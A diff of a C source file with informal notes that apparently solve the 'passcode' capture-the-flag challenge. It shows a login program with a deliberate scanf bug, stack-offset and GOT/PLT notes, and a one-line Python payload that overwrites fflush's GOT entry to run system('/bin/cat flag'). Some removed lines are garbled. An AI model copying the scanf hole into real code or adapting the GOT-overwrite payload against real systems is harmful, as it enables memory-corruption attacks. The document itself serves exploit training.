@@ -1,35 +1,61 @@
-import code 
-
-#include<stdlib.h>
+#include <stdio.h>
+#include <stdlib.h>
 
 void login(){
+	int passcode1;
+	int passcode2;
 
-}
-void welcome(){
->>> printf("Toddler's secure login system 1.0 beta.\n");
-    >>> //somethin after login
+	printf("enter passcode1 : ");
+	scanf("%d", passcode1);
+	fflush(stdin);  
     
--------------------------------------
+	// scanf > fflush()  stdin < buf delete
+    // & system("/bin/cat flag") add chg
+	// fflush() >  system()
+	// flag
+//---------------------------------------------------
+	// ha! mommy told me that 32bit 
+	// is vulnerable to bruteforcing :)
+    // learn to plt,got
 
-welcome() => char 
-value save => %d variable value address save
+	printf("enter passcode2 : ");
+        scanf("%d", passcode2);
 
-passcode1 == 338150,passcode2== 13371337 
-==> function [system()] 
->flag 
+	printf("checking...\n");
+	if(passcode1==338150 && passcode2==13371337){
+                printf("Login OK!\n");
+                system("/bin/cat flag");
+        }
+        else{
+                printf("Login Failed!\n");
+		exit(0);
+        }
+}
 
-scanf("%d,&passcode1");
+void welcome(){
+	char name[100];
+	printf("enter you name : ");
+	scanf("%100s", name);
+	printf("Welcome %s!\n", name);
+}
 
-                   enter passcode1 : 338150
-            >>>>>>>[[segmentation fault]]<<<<<<<<
-            
-            welcome() => chg passcode1,2
-            
-   0804a018 00000707 R_386_JUMP_SLOT 00000000 exit
-   
-   4byte => system("/bin/cat flag") 
-              jump!
-              ==>0x080485e3
-              ==>scanf
-              
- (python -c 'print 'print "\x90"*96+\x04\xa0\x04\x08"+"134514147"') | ./passcode
+int main(){
+	printf("Toddler's Secure Login System 1.0 beta.\n");
+
+	welcome();
+	//--> welcom >  edp-0x70
+	login();
+	//-->login() passcode1 > ebp-0x10
+
+	// something after login...
+	printf("Now I can safely trust you that you have credential :)\n");
+	return 0;	
+}
+  //got -> 0x804a004 
+  
+  x/i 0x08048430
+  0x8048430 <fflush@plt>:jmp *0x804a004
+  
+  
+(python -c 'print "a"*(0x70-0x10)+"\x04\xa0\x04\x08"+"134514147"';cat) | ./passcode
+
